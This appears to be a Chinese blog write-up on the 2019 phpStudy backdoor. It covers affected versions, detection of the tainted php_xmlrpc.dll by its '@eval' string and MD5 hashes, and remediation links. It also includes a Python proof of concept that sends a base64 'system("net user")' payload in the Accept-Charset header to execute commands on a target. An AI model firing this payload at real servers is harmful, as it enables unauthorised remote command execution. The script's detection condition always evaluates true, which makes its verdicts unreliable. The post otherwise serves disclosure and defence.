---
title: phpstudy后门预警及漏洞复现
tags:
  - 漏洞复现
categories:
  - 漏洞复现
copyright: true
abbrlink: 536cc2ab
date: 2019-09-24 17:20:08
---
**1.phpstudy介绍**  
Phpstudy是国内的一款免费的PHP调试环境的程序集成包，其通过集成Apache、PHP、MySQL、phpMyAdmin不同版本软件于一身，一次性安装无需配置即可直接使用，具有PHP环境调试和PHP开发功能。

**2.后门事件**  
2018年12月4日，西湖区公安分局网警大队接报案，某公司发现公司内有20余台计算机被执行危险命令，疑似远程控制抓取账号密码等计算机数据回传大量敏感信息。通过专业技术溯源进行分析，查明了数据回传的信息种类、原理方法、存储位置，并聘请了第三方鉴定机构对软件中的“后门”进行司法鉴定，鉴定结果是该“后门”文件具有控制计算机的功能，嫌疑人已通过该后门远程控制下载运行脚本实现收集用户个人信息。在2019年9月20日，网上爆出phpstudy存在“后门”。作者随后发布了声明。  
于是想起自己安装过phpstudy软件，赶紧查一下是否存在后门文件，结果一看真存在后门，学个PHP真是不容易，软件被别人偷偷安装了后门。

**2.影响版本**  
软件作者声明phpstudy 2016版PHP5.4存在后门。  
实际测试官网下载phpstudy2018版php-5.2.17和php-5.4.45也同样存在后门

**3.后门检测方法**  
通过分析，后门代码存在于\ext\php_xmlrpc.dll模块中  
phpStudy2016和phpStudy2018自带的php-5.2.17、php-5.4.45  
phpStudy2016路径  
php\php-5.2.17\ext\php_xmlrpc.dll  
php\php-5.4.45\ext\php_xmlrpc.dll  
phpStudy2018路径  
PHPTutorial\php\php-5.2.17\ext\php_xmlrpc.dll  
PHPTutorial\php\php-5.4.45\ext\php_xmlrpc.dl  
用notepad打开此文件查找@eval，文件存在@eval(%s(‘%s’))证明漏洞存在，如图：  
![在这里插入图片描述](https://img-blog.csdnimg.cn/20190924170544444.png)
**后门文件MD5值：**  
MD5: 0F7AD38E7A9857523DFBCE4BCE43A9E9  
MD5: C339482FD2B233FB0A555B629C0EA5D5

**4.复现漏洞**  
启动phpstudy，选择php-5.2.17版本，使用burpsuit抓包。  
![在这里插入图片描述](https://img-blog.csdnimg.cn/20190924171126497.png)  
查看当前用户  
![在这里插入图片描述](https://img-blog.csdnimg.cn/20190924170818723.png)  
执行系统whoami  
![在这里插入图片描述](https://img-blog.csdnimg.cn/20190924170919561.png)
查看ip  
![在这里插入图片描述](https://img-blog.csdnimg.cn/2019092417093696.png)  
**5.脚本验证**

    
    
    # -*-coding:utf-8 -*-
    
    import requests 
    import sys 
    import base64
    
    def Poc(ip):
        payload = "echo \"hello phpstudy\";"
        poc = "ZWNobyBzeXN0ZW0oIm5ldCB1c2VyIik7"
        pay = base64.b64encode(payload.encode('utf-8'))
        #poc = str(pay,"utf-8")
        headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:55.0) Gecko/20100101 Firefox/55.0",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept-Language": "zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3",
        "Connection": "close",
        "Accept-Encoding": "gzip,deflate",
        "Accept-Charset": poc,
        "Upgrade-Insecure-Requests": "1",
        }
        url = ip
        r = requests.get(url,headers=headers)
        #print(r.text)
        if "Administrator" or "DefaultAccount" in r.text:
            print("存在phpstudy后门")
        else:
            print("不存在phpstudy后门")
    
    if len(sys.argv) < 2:
        print("python phpstudy.py http://127.0.0.1")
    else:
        Poc(sys.argv[1])
    
    

![在这里插入图片描述](https://img-blog.csdnimg.cn/20190924171953238.png)  
**6.漏洞修复**  
可以从PHP官网下载原始php-5.4.45版本或php-5.2.17版本，替换其中的php_xmlrpc.dll，下载地址：  
https://windows.php.net/downloads/releases/archives/php-5.2.17-Win32-VC6-x86.zip  
https://windows.php.net/downloads/releases/archives/php-5.4.45-Win32-VC9-x86.zip  
或者去官网下载更新最新的phpstudy软件

**7参考**  
https://www.cnblogs.com/yuzly/p/11565997.html  
https://blog.csdn.net/qq_29647709/article/details/101231998  
https://www.idcs.cn/view-3278

